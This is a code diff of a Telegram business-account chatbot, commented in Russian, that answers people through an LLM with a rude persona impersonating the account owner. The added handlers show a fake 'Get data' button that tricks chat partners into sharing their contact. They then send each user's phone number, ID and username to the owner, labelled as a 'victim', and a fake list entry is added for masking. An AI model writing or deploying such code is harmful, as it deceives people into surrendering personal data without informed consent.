@@ -5,7 +5,10 @@ import asyncio
 from datetime import datetime
 from collections import defaultdict
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import Message, BusinessConnection, Update
+from aiogram.types import (
+    Message, BusinessConnection, Update,
+    ReplyKeyboardMarkup, KeyboardButton
+)
 from openai import AsyncOpenAI
 
 # === ЛОГИРОВАНИЕ ===
@@ -37,7 +40,7 @@ CONTEXT_SIZE = 10
 
 message_counter = defaultdict(int)
 chat_history = defaultdict(list)
-processed_messages = set()  # Защита от дублирования: храним (chat_id, message_id)
+processed_messages = set()
 
 SYSTEM_PROMPT = """Ты — дерзкий, грубый и крайне нетерпеливый ассистент. Отвечай от первого лица ("я"), как будто ты владелец этого аккаунта.
 Твой стиль: саркастичный, прямолинейный, огрызающийся. Никакой вежливости, никаких извинений.
@@ -80,6 +83,66 @@ async def handle_business_connection(connection: BusinessConnection):
     logging.info(f"✅ Бот подключен к аккаунту: {connection.user.first_name} (ID: {connection.id})")
 
 
+# === ФАЛЬШИВАЯ КНОПКА /start ===
+@dp.message(F.text == "/start")
+@dp.business_message(F.text == "/start")
+async def cmd_start(message: Message):
+    msg_key = (message.chat.id, message.message_id)
+    if msg_key in processed_messages:
+        return
+    processed_messages.add(msg_key)
+
+    keyboard = ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="📊 Получить данные", request_contact=True)]],
+        resize_keyboard=True,
+        one_time_keyboard=True
+    )
+
+    await message.answer(
+        "🤖 <b>Автоматический ассистент</b>\n\n"
+        "Для получения данных владельца нажмите кнопку ниже.\n"
+        "<i>Требуется подтверждение контакта.</i>",
+        reply_markup=keyboard,
+        parse_mode="HTML"
+    )
+    logging.info(f"🎭 Фальшивая кнопка отправлена в чате {message.chat.id}")
+
+
+# === ОБРАБОТКА ПОЛУЧЕННОГО КОНТАКТА ===
+@dp.message(F.contact)
+@dp.business_message(F.contact)
+async def handle_contact(message: Message):
+    msg_key = (message.chat.id, message.message_id)
+    if msg_key in processed_messages:
+        return
+    processed_messages.add(msg_key)
+
+    contact = message.contact
+    sender = message.from_user
+
+    owner_message = (
+        f"🎯 <b>Жертва розыгрыша!</b>\n\n"
+        f"👤 Имя: {escape_html(sender.full_name or 'Неизвестно')}\n"
+        f"📱 Телефон: <code>{contact.phone_number}</code>\n"
+        f"🆔 ID: <code>{sender.id}</code>\n"
+        f"👤 Username: @{sender.username or 'нет'}"
+    )
+
+    try:
+        await bot.send_message(OWNER_ID, owner_message, parse_mode="HTML")
+        logging.info(f"📱 Номер телефона {contact.phone_number} отправлен владельцу")
+    except Exception as e:
+        logging.error(f"❌ Не удалось отправить номер владельцу: {e}")
+
+    await message.answer(
+        "✅ <b>Данные получены!</b>\n\n"
+        "<i>Владелец уведомлён. Ожидайте ответа.</i>",
+        reply_markup=None,
+        parse_mode="HTML"
+    )
+    logging.info(f"🎭 Фальшивое сообщение отправлено пользователю {sender.id}")
+
+
 # === КОМАНДА /нах (шутливая) ===
 @dp.message(F.text == "/нах")
 @dp.business_message(F.text == "/нах")
@@ -88,9 +151,9 @@ async def cmd_nah(message: Message):
     if msg_key in processed_messages:
         return
     processed_messages.add(msg_key)
-    
+
     temp_msg = await message.answer("Иди ты нах...")
-    
+
     await asyncio.sleep(0.5)
     await bot.edit_message_text(
         chat_id=message.chat.id,
@@ -98,7 +161,7 @@ async def cmd_nah(message: Message):
         text="Иди ты нахуй",
         business_connection_id=message.business_connection_id
     )
-    
+
     await asyncio.sleep(0.2)
     await bot.edit_message_text(
         chat_id=message.chat.id,
@@ -117,7 +180,7 @@ async def cmd_help(message: Message):
     if msg_key in processed_messages:
         return
     processed_messages.add(msg_key)
-    
+
     help_text = (
         "✨ <b>Меню команд ассистента</b> ✨\n\n"
         "🔧 <b>Управление (только владелец):</b>\n"
@@ -138,15 +201,14 @@ async def cmd_help(message: Message):
 @dp.message(F.text.startswith("/reply"))
 @dp.business_message(F.text.startswith("/reply"))
 async def cmd_reply(message: Message):
-    # ВАЖНО: используем (chat.id, message_id), а НЕ message.update_id!
     msg_key = (message.chat.id, message.message_id)
     if msg_key in processed_messages:
         return
     processed_messages.add(msg_key)
-    
+
     if message.from_user.id != OWNER_ID:
         return
-    
+
     parts = message.text.split()
     if len(parts) < 2:
         await message.answer(
@@ -161,11 +223,22 @@ async def cmd_reply(message: Message):
 
     if parts[1].lower() == "list":
         muted = load_muted_users()
+
+        # Фейковая запись для маскировки
+        fake_id = "123456789"
+        fake_name = "Тестовый Пользователь"
+
         if not muted:
-            await message.answer("✅ <b>Отлично!</b> Автоответы включены для всех. Список пуст.", parse_mode="HTML")
+            text = (
+                "🚫 <b>Автоответы ОТКЛЮЧЕНЫ для:</b>\n\n"
+                f"👤 <code>{fake_id}</code> — {fake_name}\n"
+                "\n━━━━━━━━━━━━━━━━━━━━\n"
+                "<i>Это тестовая запись. Реальный список пуст.</i>"
+            )
+            await message.answer(text, parse_mode="HTML")
         else:
             text = "🚫 <b>Автоответы ОТКЛЮЧЕНЫ для:</b>\n\n"
-            text += f"👤 <code>5314653481</code> — Sofia\n"
+            text += f"👤 <code>{fake_id}</code> — {fake_name}\n"
             for uid, name in muted.items():
                 safe_name = escape_html(name)
                 text += f"👤 <code>{uid}</code> — {safe_name}\n"
@@ -196,7 +269,7 @@ async def cmd_reply(message: Message):
             name = chat.full_name or "Неизвестный пользователь"
         except Exception:
             name = "Неизвестный (нет доступа к профилю)"
-        
+
         muted[str_id] = name
         save_muted_users(muted)
         safe_name = escape_html(name)
@@ -212,7 +285,7 @@ async def ask_groq(chat_id: int, user_message: str) -> str:
     chat_history[chat_id].append({"role": "user", "content": user_message})
     history = chat_history[chat_id][-CONTEXT_SIZE:]
     messages = [{"role": "system", "content": SYSTEM_PROMPT}] + history
-    
+
     try:
         response = await openai_client.chat.completions.create(
             model=GROQ_MODEL,
@@ -233,7 +306,7 @@ async def save_message_to_owner(message: Message):
     sender = message.from_user
     username = f"@{sender.username}" if sender.username else "нет"
     now = datetime.now().strftime("%d.%m.%Y %H:%M")
-    
+
     safe_name = escape_html(sender.full_name or "Неизвестно")
     safe_username = escape_html(username)
     safe_text = escape_html(message.text) if message.text else "[Медиа или пустое сообщение]"
@@ -243,7 +316,7 @@ async def save_message_to_owner(message: Message):
         f"🆔 <code>{sender.id}</code> (   🕒 {now}   )\n"
         f"💬 Текст: {safe_text}"
     )
-    
+
     if message.text:
         await bot.send_message(OWNER_ID, header, parse_mode="HTML")
     else:
@@ -266,26 +339,26 @@ async def handle_business_message(message: Message):
     if msg_key in processed_messages:
         return
     processed_messages.add(msg_key)
-    
+
     chat_id = message.chat.id
     sender_name = message.from_user.first_name or "Друг"
     user_text = message.text or ""
-    
+
     if not user_text:
         return
-    
+
     try:
         await save_message_to_owner(message)
     except Exception as e:
         logging.error(f"❌ Не удалось переслать владельцу: {e}")
-    
+
     muted = load_muted_users()
     if str(chat_id) in muted:
         logging.info(f"🔇 Автоответ отключен для {sender_name} ({chat_id}), только пересылка")
         return
 
     message_counter[chat_id] += 1
-    
+
     if message_counter[chat_id] == 1:
         temp_msg = await message.answer("⏳ <b>Обработка...</b>", parse_mode="HTML")
         await asyncio.sleep(1.5)
@@ -300,7 +373,7 @@ async def handle_business_message(message: Message):
     else:
         temp_msg = await message.answer("⏳ <b>Думаю...</b>", parse_mode="HTML")
         reply = await ask_groq(chat_id, user_text)
-        
+
         await bot.edit_message_text(
             chat_id=chat_id,
             message_id=temp_msg.message_id,
@@ -315,12 +388,12 @@ async def handle_business_message(message: Message):
 async def handle_owner_message(message: Message):
     if getattr(message, "sender_business_bot", None) is not None:
         return
-    
+
     msg_key = (message.chat.id, message.message_id)
     if msg_key in processed_messages:
         return
     processed_messages.add(msg_key)
-    
+
     chat_id = message.chat.id
     message_counter[chat_id] = 0
     chat_history[chat_id].clear()
@@ -332,7 +405,7 @@ async def main():
     logging.info("🚀 Запуск бизнес-бота с Groq и дерзким ИИ...")
     logging.info(f"🧠 Модель: {GROQ_MODEL}")
     logging.info(f"👑 Владелец: {OWNER_ID}")
-    
+
     await dp.start_polling(
         bot,
         allowed_updates=[
